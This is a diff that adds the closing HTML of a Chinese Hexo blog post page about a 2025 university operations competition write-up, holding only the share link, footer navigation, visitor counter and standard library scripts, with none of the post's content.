+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/2025%E9%AB%98%E6%A0%A1%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E5%A4%8D%E7%8E%B0/&t=2025高校管理运维赛复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
